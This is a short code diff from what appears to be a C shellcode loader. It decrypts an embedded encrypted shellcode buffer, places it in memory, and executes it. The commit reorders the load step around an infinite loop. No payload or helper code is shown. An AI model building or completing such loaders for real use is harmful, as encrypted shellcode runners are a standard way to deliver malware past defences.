@@ -277,17 +277,17 @@ int main(void) {
     init_kernel_library();
 
     decrypt_data(shellcode_to_execute, sizeof(shellcode_to_execute));
+
+    void *placed_shellcode = shellcode_handling_load(shellcode_to_execute, sizeof(shellcode_to_execute));
+    if(placed_shellcode == NULL){
+	return -1;
+    }
     
     print_minimal();
     while(1){
 
     }
     print_minimal();
-    
-    void *placed_shellcode = shellcode_handling_load(shellcode_to_execute, sizeof(shellcode_to_execute));
-    if(placed_shellcode == NULL){
-	return -1;
-    }
     
     shellcode_handling_execute(placed_shellcode + iv_length);
     return 0;
